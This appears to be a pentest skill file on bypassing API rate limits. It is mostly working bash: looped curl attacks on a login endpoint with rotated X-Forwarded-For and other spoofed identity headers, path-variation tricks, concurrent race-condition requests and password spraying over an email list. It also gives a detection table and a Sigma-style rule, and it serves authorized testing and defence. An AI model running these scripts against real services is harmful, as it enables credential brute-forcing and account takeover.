<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: detecting-api-rate-limit-bypass
description: >-
  Detect and exploit API rate limiting weaknesses including header manipulation,
  endpoint path variation, distributed request patterns, and race conditions
  that bypass throttling controls.
domain: cybersecurity
subdomain: api-security
tags:
  - rate-limiting
  - api-security
  - owasp-api4
  - brute-force
  - throttling
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1110"]
  owasp-api: ["API4"]
  tools: ["curl", "ffuf", "burp-suite", "turbo-intruder"]
---

# Detecting API Rate Limit Bypass

## Overview

Rate limiting prevents abuse by capping request volume per client. Bypasses
exploit inconsistencies in how the API identifies callers, counts requests,
or applies limits across paths and methods. OWASP API4:2023 — Unrestricted
Resource Consumption.

## Prerequisites

- Tools: ["curl", "ffuf", "burp-suite", "turbo-intruder"]
- Authorized testing engagement with written scope
- Understanding of the target's expected rate limits

## Key Concepts

- **Identifier spoofing**: Rotating X-Forwarded-For, X-Real-IP to reset counters
- **Path normalization**: `/api/login` vs `/api/./login` vs `/API/LOGIN`
- **Method switching**: POST → PUT, GET with body parameters
- **Distributed bypass**: Splitting requests across API keys or tokens
- **Race conditions**: Concurrent requests before counter increments

## Workflow

### Step 1: Baseline Rate Limit Discovery

```bash
# Discover rate limit threshold
for i in $(seq 1 500); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://target.com/api/login \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrong'$i'"}')
  echo "Request $i: HTTP $STATUS"
  [ "$STATUS" = "429" ] && echo "[!] Rate limited at request $i" && break
done

# Check rate limit headers
curl -si -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"wrong"}' | \
  grep -iE 'x-rate|retry-after|x-ratelimit'
```

### Step 2: Header-Based Bypass

```bash
# X-Forwarded-For rotation
for i in $(seq 1 200); do
  IP="10.0.$((i / 256)).$((i % 256))"
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://target.com/api/login \
    -H "X-Forwarded-For: $IP" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@target.com","password":"pass'$i'"}')
  echo "$IP → HTTP $STATUS"
done

# Other identity headers to try
HEADERS=(
  "X-Forwarded-For" "X-Real-IP" "X-Originating-IP"
  "X-Client-IP" "X-Forwarded" "Forwarded-For"
  "X-Remote-IP" "X-Remote-Addr" "True-Client-IP"
  "CF-Connecting-IP" "X-Cluster-Client-IP"
)
for H in "${HEADERS[@]}"; do
  curl -s -o /dev/null -w "$H: %{http_code}\n" \
    -H "$H: 127.0.0.1" https://target.com/api/login
done
```

### Step 3: Path Normalization Bypass

```bash
# Test path variations that may bypass rate limit routing
PATHS=(
  "/api/login"
  "/api/./login"
  "/api/login/"
  "/api/login?"
  "/API/LOGIN"
  "/api/v1/../login"
  "/api/login%00"
  "/api/login#"
  "/api/Login"
)
for P in "${PATHS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com$P" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"test"}')
  echo "$P → HTTP $STATUS"
done
```

### Step 4: Race Condition Testing

```bash
# Send concurrent requests using GNU parallel
seq 1 50 | parallel -j50 \
  'curl -s -o /dev/null -w "Request {}: %{http_code}\n" \
    -X POST https://target.com/api/login \
    -H "Content-Type: application/json" \
    -d '\''{"email":"admin@target.com","password":"test{}"}'\'

# Turbo Intruder (Burp extension) for precise race conditions
# Use single-packet attack for HTTP/2 connections
```

### Step 5: Account Rotation Bypass

```bash
# Rotate target accounts if rate limit is per-account
while IFS= read -r email; do
  curl -s -o /dev/null -w "$email: %{http_code}\n" \
    -X POST https://target.com/api/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$email\",\"password\":\"Password123\"}"
done < emails.txt
```

## Detection Opportunities

| Signal | Source | Description |
|--------|--------|-------------|
| Rotating X-Forwarded-For | WAF logs | IP header spoofing attempts |
| Path variation patterns | API gateway | Normalization bypass attempts |
| Concurrent auth failures | Auth logs | Race condition exploitation |
| High 429 rate | Load balancer | Active rate limit probing |

```yaml
title: API Rate Limit Bypass via Header Rotation
id: b2c3d4e5-f6a7-8901-bcde-f23456789012
status: experimental
description: Detects rate limit bypass attempts using IP header rotation
logsource:
  category: webserver
detection:
  selection:
    cs-uri-stem|contains: '/api/'
    cs-method: POST
  xff_rotation:
    x-forwarded-for|count_distinct: '>10'
  timeframe: 5m
  condition: selection and xff_rotation | count() by cs-uri-stem > 50
falsepositives:
  - Legitimate load-balanced traffic from corporate proxies
level: high
tags:
  - attack.t1110
  - attack.credential_access
```

## Verification

- [ ] Baseline rate limit threshold documented
- [ ] Header-based bypass techniques tested
- [ ] Path normalization bypass tested
- [ ] Race condition susceptibility assessed
- [ ] Results documented with evidence
- [ ] Detection artifacts identified

## References

- [OWASP API4:2023 — Unrestricted Resource Consumption](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)
- [Turbo Intruder](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
- [MITRE ATT&CK T1110](https://attack.mitre.org/techniques/T1110/)
